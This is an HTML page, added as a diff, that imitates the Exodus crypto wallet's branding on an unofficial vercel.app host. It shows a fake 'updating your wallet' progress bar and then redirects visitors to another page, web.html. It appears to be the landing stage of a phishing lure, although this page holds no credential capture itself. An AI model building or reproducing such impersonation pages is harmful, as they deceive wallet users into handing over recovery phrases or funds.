@@ -1,0 +1,441 @@
+<!-- url: https://center-exodus-backup.vercel.app
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Exodus Portfolio - Update Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      font-family: "Inter", "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+    .header {
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding: 30px 40px 0 40px;
+      box-sizing: border-box;
+    }
+    .logo-group {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .logo-group img {
+      height: 45px;
+      filter: drop-shadow(0 4px 12px rgba(102, 126, 234, 0.3));
+    }
+    .logo-group .brand {
+      font-size: 1.4em;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: 2px;
+      margin-left: 4px;
+      line-height: 1.1;
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+    .brand span {
+      font-size: 0.85em;
+      font-weight: 400;
+      color: rgba(255, 255, 255, 0.8);
+      letter-spacing: 1px;
+    }
+    .download-btn {
+      background: rgba(255, 255, 255, 0.2);
+      backdrop-filter: blur(10px);
+      color: #fff;
+      font-weight: 600;
+      padding: 12px 32px;
+      border-radius: 24px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      cursor: pointer;
+      font-size: 1em;
+      margin-top: 2px;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+    }
+    .download-btn:hover {
+      background: rgba(255, 255, 255, 0.3);
+      transform: translateY(-2px);
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
+    }
+    .main-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      flex: 1;
+      min-height: 75vh;
+      margin-top: 40px;
+    }
+    .shield {
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(20px);
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      width: 140px;
+      height: 140px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 42px;
+      margin-top: 10px;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
+      position: relative;
+    }
+    .shield::after {
+      content: "";
+      position: absolute;
+      inset: 8px;
+      border-radius: 50%;
+      border: 2px solid rgba(102, 126, 234, 0.3);
+      pointer-events: none;
+    }
+    .shield img {
+      width: 70px;
+      height: 70px;
+      display: block;
+      z-index: 2;
+      filter: drop-shadow(0 4px 12px rgba(102, 126, 234, 0.3));
+    }
+    .progress-label {
+      font-size: 2.2em;
+      font-weight: 600;
+      color: #fff;
+      letter-spacing: 1px;
+      margin-bottom: 32px;
+      text-align: center;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      line-height: 1.2;
+    }
+    .progress-container {
+      width: 420px;
+      max-width: 90vw;
+    }
+    .progress-bar-bg {
+      width: 100%;
+      height: 20px;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.2);
+      backdrop-filter: blur(10px);
+      position: relative;
+      overflow: hidden;
+      margin-top: 5px;
+      margin-bottom: 15px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+    }
+    .progress-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+      border-radius: 8px;
+      width: 0;
+      color: #fff;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: absolute;
+      top: 0;
+      left: 0;
+      transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
+    }
+    .progress-percentage {
+      color: #fff;
+      font-weight: 700;
+      font-size: 1.1em;
+      position: absolute;
+      left: 20px;
+      top: 0;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      z-index: 1;
+      pointer-events: none;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+    }
+    .footer {
+      width: 100%;
+      padding: 15px 40px 12px 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      box-sizing: border-box;
+      font-size: 0.97em;
+      color: rgba(255, 255, 255, 0.8);
+      letter-spacing: 0.5px;
+    }
+    .footer .left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .footer .left img {
+      width: 24px;
+      height: 24px;
+      filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
+    }
+    .footer .links a {
+      color: rgba(255, 255, 255, 0.9);
+      margin: 0 11px;
+      text-decoration: none;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      font-weight: 500;
+    }
+    .footer .links a:hover {
+      text-decoration: underline;
+      color: #fff;
+      transform: translateY(-1px);
+    }
+    @media (max-width: 768px) {
+      body {
+        min-height: 100vh;
+        padding: 0;
+      }
+      
+      .header {
+        padding: 20px 15px 0 15px;
+        flex-direction: column;
+        align-items: center;
+        gap: 20px;
+      }
+      
+      .logo-group {
+        gap: 10px;
+      }
+      
+      .logo-group img {
+        height: 35px;
+      }
+      
+      .logo-group .brand {
+        font-size: 1.2em;
+        letter-spacing: 1px;
+      }
+      
+      .brand span {
+        font-size: 0.8em;
+      }
+      
+      .download-btn {
+        padding: 10px 24px;
+        font-size: 0.9em;
+        margin-top: 0;
+      }
+      
+      .main-content {
+        margin-top: 20px;
+        padding: 0 20px;
+        min-height: 60vh;
+      }
+      
+      .shield {
+        width: 100px;
+        height: 100px;
+        margin-bottom: 30px;
+        margin-top: 0;
+      }
+      
+      .shield img {
+        width: 50px;
+        height: 50px;
+      }
+      
+      .progress-label {
+        font-size: 1.3em;
+        margin-bottom: 25px;
+        line-height: 1.3;
+        padding: 0 10px;
+      }
+      
+      .progress-container {
+        width: 100%;
+        max-width: 320px;
+      }
+      
+      .progress-bar-bg {
+        height: 16px;
+        margin-bottom: 12px;
+      }
+      
+      .progress-percentage {
+        font-size: 1em;
+        left: 15px;
+      }
+      
+      .footer {
+        padding: 15px 15px 12px 15px;
+        flex-direction: column;
+        align-items: center;
+        gap: 15px;
+        text-align: center;
+      }
+      
+      .footer .left {
+        gap: 8px;
+      }
+      
+      .footer .left img {
+        width: 20px;
+        height: 20px;
+      }
+      
+      .footer .links {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 10px;
+      }
+      
+      .footer .links a {
+        margin: 0 5px;
+        font-size: 0.9em;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .header {
+        padding: 15px 10px 0 10px;
+      }
+      
+      .logo-group {
+        gap: 8px;
+      }
+      
+      .logo-group img {
+        height: 30px;
+      }
+      
+      .logo-group .brand {
+        font-size: 1.1em;
+        letter-spacing: 0.5px;
+      }
+      
+      .brand span {
+        font-size: 0.75em;
+      }
+      
+      .download-btn {
+        padding: 8px 20px;
+        font-size: 0.85em;
+      }
+      
+      .main-content {
+        padding: 0 15px;
+        margin-top: 15px;
+      }
+      
+      .shield {
+        width: 90px;
+        height: 90px;
+        margin-bottom: 25px;
+      }
+      
+      .shield img {
+        width: 45px;
+        height: 45px;
+      }
+      
+      .progress-label {
+        font-size: 1.1em;
+        margin-bottom: 20px;
+        padding: 0 5px;
+      }
+      
+      .progress-container {
+        max-width: 280px;
+      }
+      
+      .progress-bar-bg {
+        height: 14px;
+        margin-bottom: 10px;
+      }
+      
+      .progress-percentage {
+        font-size: 0.9em;
+        left: 12px;
+      }
+      
+      .footer {
+        padding: 12px 10px 10px 10px;
+      }
+      
+      .footer .links a {
+        font-size: 0.8em;
+        margin: 0 3px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <div class="header">
+    <div class="logo-group">
+      <img src="assets/logo.png" alt="Exodus Logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDUiIGhlaWdodD0iNDUiIHZpZXdCb3g9IjAgMCA0NSA0NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQ1IiBoZWlnaHQ9IjQ1IiByeD0iOSIgZmlsbD0idXJsKCNncmFkaWVudDBfbGluZWFyXzFfMSkiLz4KPHA9Ik0yMi41IDExTDE1IDIyLjVMMjIuNSAzNEwzMCAyMi41TDIyLjUgMTFaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMjAuMjUgMTUuNzVMMjQuNzUgMTUuNzVMMjQuNzUgMjkuMjVMMjAuMjUgMjkuMjVaIiBmaWxsPSJ3aGl0ZSIvPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJncmFkaWVudDBfbGluZWFyXzFfMSIgeDE9IjAiIHkxPSIwIiB4Mj0iNDUiIHkyPSI0NSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgo8c3RvcCBzdG9wLWNvbG9yPSIjNjY3ZWVhIi8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iIzc2NGJhMiIvPgo8L2xpbmVhckdyYWRpZW50Pgo8L2RlZnM+Cjwvc3ZnPgo='" />
+      <span class="brand">
+        EXODUS
+        <span>Portfolio</span>
+      </span>
+    </div>
+    <button class="download-btn">Download App</button>
+  </div>
+  <!-- Main Content -->
+  <div class="main-content">
+    <div class="shield">
+      <img src="assets/logoexo.svg" alt="Exodus Logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzAiIGhlaWdodD0iNzAiIHZpZXdCb3g9IjAgMCA3MCA3MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjcwIiBoZWlnaHQ9IjcwIiByeD0iMTQiIGZpbGw9InVybCgjZ3JhZGllbnQwX2xpbmVhcl8xXzEpIi8+CjxwYXRoIGQ9Ik0zNSAxN0wyMiAzNUwzNSA1M0w0OCAzNUwzNSAxN1oiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0zMS41IDI0LjVMMzguNSAyNC41TDM4LjUgNDUuNUwzMS41IDQ1LjVaIiBmaWxsPSJ3aGl0ZSIvPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJncmFkaWVudDBfbGluZWFyXzFfMSIgeDE9IjAiIHkxPSIwIiB4Mj0iNzAiIHkyPSI3MCIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgo8c3RvcCBzdG9wLWNvbG9yPSIjNjY3ZWVhIi8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iIzc2NGJhMiIvPgo8L2xpbmVhckdyYWRpZW50Pgo8L2RlZnM+Cjwvc3ZnPgo='" />
+    </div>
+    <div class="progress-label">GETTING READY TO UPDATE YOUR WALLET</div>
+    <div class="progress-container">
+      <div class="progress-bar-bg">
+        <div class="progress-bar-fill" id="progressFill"></div>
+        <div class="progress-percentage" id="progressPercent">0%</div>
+      </div>
+    </div>
+  </div>
+  <!-- Footer -->
+  <div class="footer">
+    <div class="left">
+      <img src="assets/logoexo.svg" alt="Exodus Small" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iNSIgZmlsbD0idXJsKCNncmFkaWVudDBfbGluZWFyXzFfMSkiLz4KPHA9Ik0xMiA2TDggMTJMMTIgMThMMTYgMTJMMTIgNloiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0xMC41IDkuNUwxMy41IDkuNUwxMy41IDE0LjVMMTAuNSAxNC41WiIgZmlsbD0id2hpdGUiLz4KPGRlZnM+CjxsaW5lYXJHcmFkaWVudCBpZD0iZ3JhZGllbnQwX2xpbmVhcl8xXzEiIHgxPSIwIiB5MT0iMCIgeDI9IjI0IiB5Mj0iMjQiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agc3RvcC1jb2xvcj0iIzY2N2VlYSIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM3NjRiYTIiLz4KPC9saW5lYXJHcmFkaWVudD4KPC9kZWZzPgo8L3N2Zz4K'" />
+      Exodus™ © 2025 All Rights Reserved.
+    </div>
+    <div class="links">
+      <a href="#">About</a>
+      <a href="#">Privacy Policy</a>
+      <a href="#">Licensing</a>
+      <a href="#">Contact</a>
+    </div>
+  </div>
+  <!-- Progress Script -->
+  <script>
+    let progress = 0;
+    const fill = document.getElementById('progressFill');
+    const percent = document.getElementById('progressPercent');
+    function updateProgress() {
+      if (progress <= 100) {
+        fill.style.width = progress + '%';
+        percent.textContent = progress + '%';
+        progress++;
+        setTimeout(updateProgress, 22); // adjust for desired speed
+      } else {
+        window.location.href = "web.html";
+      }
+    }
+    updateProgress();
+  </script>
+</body>
+</html>
